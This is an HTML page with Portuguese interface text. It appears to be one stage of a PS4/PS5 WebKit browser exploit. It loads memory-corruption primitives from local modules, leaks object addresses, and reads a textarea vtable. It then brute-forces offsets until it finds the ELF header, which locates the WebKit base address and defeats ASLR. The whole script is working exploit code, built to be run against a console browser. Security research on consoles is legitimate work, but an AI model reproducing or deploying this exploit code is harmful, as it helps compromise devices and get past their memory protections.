<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PS4 WebKit — Base via VTable</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; background: #0b0f19; color: #c8ced8;
    font: 13px/1.5 "Segoe UI", system-ui, sans-serif;
    display: flex; flex-direction: column; align-items: center;
    justify-content: flex-start; gap: 10px; padding: 14px; }
  h1 { color: #fff; font-size: 17px; }
  #status { font-size: 15px; font-weight: 700; color: #fff; text-align: center; }
  #log { width: 98%; max-width: 960px; height: 320px; background: #111827;
    border: 1px solid #1f2937; border-radius: 8px; padding: 10px 12px;
    overflow-y: auto; font-family: ui-monospace, monospace; font-size: 11px;
    color: #9fb1c3; white-space: pre-wrap; word-break: break-all; }
  #log .ok { color: #4ade80; } #log .err { color: #f87171; }
  #log .info { color: #60a5fa; } #log .warn { color: #fbbf24; }
  #log .found { color: #a78bfa; font-weight: bold; }
  .ctrl-btn { padding: 8px 16px; border-radius: 6px; border: none;
    background: #1e40af; color: #fff; cursor: pointer; font-size: 12px; font-weight: 600; }
  .ctrl-btn:hover { background: #2563eb; }
  .ctrl-btn:disabled { background: #374151; opacity: 0.5; cursor: not-allowed; }
  .note { background: #1f2937; border-left: 3px solid #22c55e; padding: 8px 12px;
    border-radius: 0 6px 6px 0; font-size: 11px; color: #d1d5db; max-width: 900px; }
</style>
</head>
<body>
<h1>PS4 WebKit — Base via VTable (Método Slopkit)</h1>
<div id="status">Inicializando...</div>
<div id="log"></div>
<div class="note">
  <b>Método do slopkit:</b> Lê o vtable da textarea e subtrai offset conhecido.<br>
  Mais confiável que brute force a partir do __ps5NativeCtor.
</div>
<div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center;">
  <button class="ctrl-btn" id="btnVtable" onclick="findBaseViaVtable()">🔎 Base via VTable</button>
  <button class="ctrl-btn" id="btnCtor" onclick="findBaseViaCtor()">🔎 Base via Ctor</button>
  <button class="ctrl-btn" onclick="clearLog()">🗑️ Limpar</button>
</div>

<script type="module">
  import { establishPrimitive } from "./resources/core.js";
  import { installWindowP } from "./resources/mem.js";
  import { int64 } from "./resources/int64.js";

  const status = document.getElementById("status");
  const logBox = document.getElementById("log");
  const btnVtable = document.getElementById("btnVtable");
  const btnCtor = document.getElementById("btnCtor");

  function log(msg, cls) {
    const line = document.createElement("div");
    line.className = cls || "info";
    line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
    logBox.appendChild(line);
    logBox.scrollTop = logBox.scrollHeight;
  }
  window.clearLog = function() { logBox.innerHTML = ""; log("Log limpo."); };

  window.findBaseViaVtable = async function() {
    const p = window.p;
    if (!p) { log("window.p nao disponivel!", "err"); return; }
    btnVtable.disabled = true; btnCtor.disabled = true;
    try {
      log("=== METODO VTABLE ===", "warn");
      let textArea = document.createElement("textarea");
      let textAreaObjAddr = p.leakval(textArea);
      log("textarea object @ 0x" + textAreaObjAddr.toString(16), "info");
      let textAreaVtPtr = p.read8(textAreaObjAddr.add32(0x18));
      log("textarea vtable ptr @ 0x" + textAreaVtPtr.toString(16), "info");
      let textAreaVtable = p.read8(textAreaVtPtr);
      log("textarea vtable[0] = 0x" + textAreaVtable.toString(16), "info");

      log("Iniciando brute force do offset do vtable...", "warn");
      const vtableAddr = textAreaVtable;
      for (let off = 0x100000; off <= 0x10000000; off += 0x100000) {
        let base = vtableAddr.sub32(off);
        let baseNum = base.hi * 0x100000000 + base.low;
        if (baseNum < 0x800000000 || baseNum >= 0x900000000) continue;
        log("[VTable] off=0x" + off.toString(16) + " => base 0x" + base.toString(16), "info");
        try {
          let magic = p.read4(base);
          let magicHex = "0x" + magic.toString(16).padStart(8, "0");
          log("  Magic: " + magicHex, "info");
          if (magicHex === "0x464c457f") {
            log("BASE ENCONTRADA via VTable!", "found");
            log("  Offset vtable_first_element = 0x" + off.toString(16), "ok");
            log("  Base = 0x" + base.toString(16), "ok");
            window.__webkitBase = base;
            status.textContent = "Base: 0x" + base.toString(16);
            status.style.color = "#4ade80";
            return;
          }
        } catch (e) { log("  Erro: " + e.message, "err"); }
        await new Promise(r => setTimeout(r, 50));
      }
      log("Nenhuma base encontrada via VTable.", "err");
    } catch (e) { log("FALHA: " + e.name + ": " + e.message, "err"); }
    finally { btnVtable.disabled = false; btnCtor.disabled = false; }
  };

  window.findBaseViaCtor = async function() {
    const p = window.p;
    const ctor = globalThis.__ps5NativeCtor;
    if (!p || typeof ctor !== "number") { log("Primitivas nao prontas", "err"); return; }
    btnVtable.disabled = true; btnCtor.disabled = true;
    try {
      log("=== METODO CTOR ===", "warn");
      log("__ps5NativeCtor = 0x" + ctor.toString(16), "info");
      const ps5Offsets = [0x34F98, 0x35808, 0x35900];
      for (const off of ps5Offsets) {
        let base = ctor - off;
        base = base & ~0x3FFF;
        let addr = new int64(base & 0xFFFFFFFF, Math.floor(base / 0x100000000));
        log("[PS5] off=0x" + off.toString(16) + " => base 0x" + addr.toString(16), "info");
        try {
          let magic = p.read4(addr);
          let magicHex = "0x" + magic.toString(16).padStart(8, "0");
          log("  Magic: " + magicHex, "info");
          if (magicHex === "0x464c457f") {
            log("BASE ENCONTRADA!", "found");
            window.__webkitBase = addr;
            status.textContent = "Base: 0x" + addr.toString(16);
            status.style.color = "#4ade80";
            return;
          }
        } catch (e) { log("  Erro: " + e.message, "err"); }
      }
      log("Brute force expandido...", "warn");
      for (let off = 0x1000; off <= 0x10000000; off += 0x4000) {
        let base = (ctor - off) & ~0x3FFF;
        if (base < 0x800000000 || base >= 0x900000000) continue;
        let addr = new int64(base & 0xFFFFFFFF, Math.floor(base / 0x100000000));
        try {
          let magic = p.read4(addr);
          if (magic === 0x464c457f) {
            log("BASE ENCONTRADA @ 0x" + addr.toString(16), "found");
            log("  Offset do ctor = 0x" + off.toString(16), "ok");
            window.__webkitBase = addr;
            status.textContent = "Base: 0x" + addr.toString(16);
            status.style.color = "#4ade80";
            return;
          }
        } catch (e) {}
        if (off % 0x100000 === 0) {
          log("Progresso: tested up to 0x" + off.toString(16), "info");
          await new Promise(r => setTimeout(r, 10));
        }
      }
      log("Nenhuma base encontrada.", "err");
    } catch (e) { log("FALHA: " + e.name + ": " + e.message, "err"); }
    finally { btnVtable.disabled = false; btnCtor.disabled = false; }
  };

  log("Carregando modulos...", "ok");
  status.textContent = "Executando exploit...";
  establishPrimitive({ onEvent: (tag, detail) => log(tag + ": " + detail, "info") })
    .then(carrier => {
      log("Core: primitivo estabelecido", "ok");
      const prim = installWindowP(carrier, { onEvent: (tag, detail) => log(tag + ": " + detail, "info"), promote: true });
      log("Mem: real pair ativo", "ok");
      window.__carrier = carrier; window.__prim = prim; window.p = prim; window.int64 = int64;
      let ctor = globalThis.__ps5NativeCtor;
      if (typeof ctor === "number") log("__ps5NativeCtor = 0x" + ctor.toString(16), "ok");
      status.textContent = "Pronto — escolha um metodo";
      status.style.color = "#60a5fa";
      try { log("Sanity leak(prim) = 0x" + prim.leakval(prim).toString(16), "ok"); } catch (e) { log("Sanity leak falhou: " + e.message, "err"); }
    })
    .catch(err => { log("FALHA: " + err.name + ": " + err.message, "err"); status.textContent = "Falha"; status.style.color = "#f87171"; });
</script>
</body>
</html>
